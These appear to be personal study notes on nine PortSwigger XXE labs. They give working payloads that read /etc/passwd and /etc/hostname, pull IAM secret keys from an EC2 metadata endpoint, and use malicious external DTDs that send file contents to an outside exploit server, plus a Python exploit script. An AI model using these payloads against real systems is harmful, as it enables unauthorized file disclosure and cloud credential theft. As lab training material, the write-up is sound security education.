## **1. Exploiting XXE using external entities to retrieve files**
This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.
1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
2. Insert the following external entity definition in between the XML declaration and the `stockCheck` element:
    `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`
3. Replace the `productId` number with a reference to the external entity: `&xxe;`. The response should contain "Invalid product ID:" followed by the contents of the `/etc/passwd` file.

step1:
![[Pasted image 20240925193628.png]]

step2:
![[Pasted image 20240925193654.png]]

step3:
![[Pasted image 20240925193806.png]]

- discovering where we can inject an XML entity and test for it :
![[Pasted image 20240925194015.png]]
- reference the entity as an internal one to prove the concept
	![[Pasted image 20240925194111.png]]

- proceed further using an external XML entity to abuse the system & reveal info
		![[Pasted image 20240925194143.png]]

## **2. Exploiting XXE to perform SSRF attacks**
This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response. The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is `http://169.254.169.254/`. This endpoint can be used to retrieve data about the instance, some of which might be sensitive. 
To solve the lab, exploit the [XXE](https://portswigger.net/web-security/xxe) vulnerability to perform an [SSRF attack](https://portswigger.net/web-security/ssrf) that obtains the server's IAM secret access key from the EC2 metadata endpoint.

1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
2. Insert the following external entity definition in between the XML declaration and the `stockCheck` element:
    `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>`
3. Replace the `productId` number with a reference to the external entity: `&xxe;`. The response should contain "Invalid product ID:" followed by the response from the metadata endpoint, which will initially be a folder name.
4. Iteratively update the URL in the DTD to explore the API until you reach `/latest/meta-data/iam/security-credentials/admin`. This should return JSON containing the `SecretAccessKey`.

Analysis:

- following xml error we will append directories in our server request 
http://169.254.169.254/
http://169.254.169.254/latest
http://169.254.169.254/latest/meta-data
http://169.254.169.254/latest/meta-data/iam
http://169.254.169.254/latest/meta-data/iam/security-credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin

```
?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY nbyte SYSTEM "http://169.254.169.254/"> ]>
<stockCheck>
	<productId>
		&nbyte;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```

```
?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY paein SYSTEM "http://169.254.169.254/latest.../.../admin"> ]>
<stockCheck>
	<productId>
		&paein;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```

![[Pasted image 20240926201314.png]]

- Python script
```
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_xxe(s, url):

    print("(+) Exploiting XXE Injection...")
    stock_url = url + "/product/stock"
    data_stock = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>'
    r = s.post(stock_url, data=data_stock, verify=False, proxies=proxies)
    print("(+) The following is the content of the secret file: ")
    print(r.text)

def main():
    if len(sys.argv) !=2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()
    url = sys.argv[1]
    exploit_xxe(s, url)
```

## **3. Blind XXE with out-of-band interaction**
This lab has a "Check stock" feature that parses XML input but does not display the result.
You can detect the [blind XXE](https://portswigger.net/web-security/xxe/blind) vulnerability by triggering out-of-band interactions with an external domain.
To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

1. Visit a product page, click "Check stock" and intercept the resulting POST request in [Burp Suite Professional](https://portswigger.net/burp/pro).
2. Insert the following external entity definition in between the XML declaration and the `stockCheck` element. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated:
    `<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>`
3. Replace the `productId` number with a reference to the external entity:
    `&xxe;`
4. Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.

Analysis:

- testing for XXE vulnerability (using internal XXE)
![[Pasted image 20240927012427.png]]

- we will try an external XXE (same response)
![[Pasted image 20240927012657.png]]

- we observe that we are in a blind XXE injection case (out of band) so we will use an external server in order to obtain a DNS lookup (we have to use burp collaborator)
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY nbyte SYSTEM "http://Burp-Collaborator-SubDomain">]>
<stockCheck>
	<productId>
		&nbyte;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```

![[Pasted image 20240927013218.png]]

## **4. Blind XXE with out-of-band interaction via XML parameter entities**
This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.
To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

1. Visit a product page, click "Check stock" and intercept the resulting POST request in [Burp Suite Professional](https://portswigger.net/burp/pro).
2. Insert the following external entity definition in between the XML declaration and the `stockCheck` element. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated:
    `<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>`
3. Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.

Analysis:

- we proceed with same steps as above but this time we encounter a different error which is telling us that the parser is doing it s job
![[Pasted image 20240927014600.png]]
![[Pasted image 20240927014716.png]]

- we will declare and reference our entity inside of the doctype 
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY % nbyte SYSTEM "http://Burp-Collaborator-SubDomain"> %nbyte; ]>
<stockCheck>
	<productId>
		1
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```

![[Pasted image 20240927015321.png]]

- we will proceed with a DNS lookup using burp collaborator server as in above example since we are now in a out of band XXE injection.

## **5. Exploiting blind XXE to exfiltrate data using a malicious external DTD**
This lab has a "Check stock" feature that parses XML input but does not display the result.
To solve the lab, exfiltrate the contents of the `/etc/hostname` file.

1. Using [Burp Suite Professional](https://portswigger.net/burp/pro), go to the [Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) tab.
2. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
3. Place the Burp Collaborator payload into a malicious DTD file:
    `<!ENTITY % file SYSTEM "file:///etc/hostname"> <!ENTITY % stack "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>"> %stack; %exfil;`
1. Click "Go to exploit server" and save the malicious DTD file on your server. Click "View exploit" and take a note of the URL.
2. You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
3. Insert the following external entity definition in between the XML declaration and the `stockCheck` element:
    `<!DOCTYPE test [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>`
7. Go back to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again.
8. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The HTTP interaction could contain the contents of the `/etc/hostname` file.

Analysis:

- first we will try an out of band exfiltration using burp collaborator/our exploit server

    `<!DOCTYPE test [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL(server/exploit)"> %xxe;]>`

    `<!DOCTYPE test [<!ENTITY % loadDtd SYSTEM "YOUR-DTD-URL(server/exploit)"> %loadDtd;]>`

- we have to create a malicious DTD file(stored on our exploit server) in order to exfiltrate the data:
	DTD file must contain a **file entity** and a **stack entity**(this method is also called stacked entities) || `&#x25;` represents the XML encoded of %  (because of entity inside of entity)

Note:
	In this case we have to retrieve a single line file (/etc/hostname) so we can manage this via building the DTD pointing to the exploit server .

- DTD exploit file (for /etc/hostname)
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % stack "<!ENTITY &#x25; exfil SYSTEM 'https://exploit-0a36000204174338c4c637de0106008f.exploit-server.net/?X=%file;'>">
%stack;
%exfil;
```

- now we are calling inside of DOCTYPE our DTD exploit file which is stored on the server:![[Pasted image 20240927220556.png]]
OR calling entities outside the DTD file
	![[Pasted image 20240927221138.png]]  

## **6. Exploiting blind XXE to retrieve data via error messages**
This lab has a "Check stock" feature that parses XML input but does not display the result.
To solve the lab, use an external DTD to trigger an error message that displays the contents of the `/etc/passwd` file.
The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.

1. Click "Go to exploit server" and save the following malicious DTD file on your server:
    `<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>"> %eval; %exfil;`
    When imported, this page will read the contents of `/etc/passwd` into the `file` entity, and then try to use that entity in a file path.
    
1. Click "View exploit" and take a note of the URL for your malicious DTD.
2. You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
3. Insert the following external entity definition in between the XML declaration and the `stockCheck` element:
    `<!DOCTYPE test [<!ENTITY % loadDTD SYSTEM "YOUR-DTD-URL"> %loadDTD;]>`

Analysis:
- out of band XXE using a DTD exploit file 
    `<!DOCTYPE test [<!ENTITY % loadDtd SYSTEM "YOUR-DTD-URL(server/exploit)"> %loadDtd;]>`

- reading multi-line data 
		![[Pasted image 20240927230532.png]]
		![[Pasted image 20240927230626.png]]

- DTD exploit file( for /etc/passwd )
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % stack "<!ENTITY &#x25; error SYSTEM 'file:///idonotexist/%file;'>"> 
%stack; 
%error;
```
	![[Pasted image 20240927231719.png]]
	![[Pasted image 20240927232654.png]]


## **7.  Exploiting XInclude to retrieve files**
This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed(partially parsed).
Because you don't control the entire XML document you can't define a DTD to launch a classic [XXE](https://portswigger.net/web-security/xxe) attack. To solve the lab, inject an `XInclude` statement to retrieve the contents of the `/etc/passwd` file.

1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
2. Set the value of the `productId` parameter to:
    `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`

Analysis:
	![[Pasted image 20240929090140.png]]

- first thought is maybe this is not taking XML but try to convert via burp to JSON / XML format
	![[Pasted image 20240929090035.png]]
	
	- If the API accepts JSON or other content we will change it to XML. If the expected is returned --> it's parsing XML so we can inject
	![[Pasted image 20240929090318.png]]

- if it will not accept none of the mentioned above formats we will use XInclude function:
	- entering an entity that does not exists(encode the `&`)  to analyse the error recieved
	![[Pasted image 20240929091055.png]]

- XInclude is useful when **we do not have control over the entire document.**
	- refer the XInclude name space first / refer the file that we want to retrieve
```
<foo
 xmlns:xi="http://www.w3.org/2001/XInclude">
 <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```
	![[Pasted image 20240929091746.png]]

## **8. Exploiting XXE via image file upload**
This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files. 
To solve the lab, upload an image that displays the contents of the `/etc/hostname` file after processing.

1. Create a local SVG image with the following content:
    ```
	<?xml version="1.0" standalone="yes"?>
	<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
	<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
	<text font-size="16" x="0" y="16">&xxe;</text>
	</svg>
``


1. Post a comment on a blog post, and upload this image as an avatar.
2. When you view your comment, you should see the contents of the `/etc/hostname` file in your image. Use the "Submit solution" button to submit the value of the server hostname.

Analysis:

-  we will create and upload a svg file that contains the exploit entity
- same as traditional xxe: we can declare an entity and view its results via the application response IF NOT we make calls outbound and perform a out of band data exfiltration

nano test.svg  --> insert the desired entity inside of the svg file

	<?xml version="1.0" standalone="yes"?>
	<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
	<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
	<text font-size="16" x="0" y="16">&xxe;</text>
	</svg>
	
	![[Pasted image 20240930191646.png]]
		![[Pasted image 20240930191727.png]]

## **9. Exploiting XXE to retrieve data by repurposing a local DTD**
This lab has a "Check stock" feature that parses XML input but does not display the result.
To solve the lab, trigger an error message containing the contents of the `/etc/passwd` file.
You'll need to reference an existing DTD file on the server and redefine an entity from it.

1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
2. Insert the following parameter entity definition in between the XML declaration and the `stockCheck` element:
    ```
    <!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> 
    <!ENTITY % ISOamso ' <!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> 
    &#x25;eval; 
    &#x25;error; '> 
    %local_dtd; ]>
    ```
    
    This will import the Yelp DTD, then redefine the `ISOamso` entity, triggering an error message containing the contents of the `/etc/passwd` file.

Analysis:
- we will use a normal out of band xxe injection to observe the error recieved
	![[Pasted image 20240930193712.png]]

- afterwards we will inject an inexistent entity for the same reasons
	![[Pasted image 20240930193726.png]]

- using a dtd enumeration list(https://github.com/GoSecure/dtd-finder/blob/master/list/dtd_files.txt) we will use Burp intruder to inject:
	![[Pasted image 20240930193909.png]]

- we have discovered following path: `/usr/share/xml/fontconfig/fonts.dtd`
	![[Pasted image 20240930194015.png]]

- Payload:
	  ![[Pasted image 20240930194309.png]]

```markup
<!DOCTYPE message [
    <!ENTITY % nbyte SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">

    <!ENTITY % expr 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %nbyte;
]>
<message></message>
```

- now, the contents of the desired file will be displayed via the error message displayed
	![[Pasted image 20240930194637.png]]

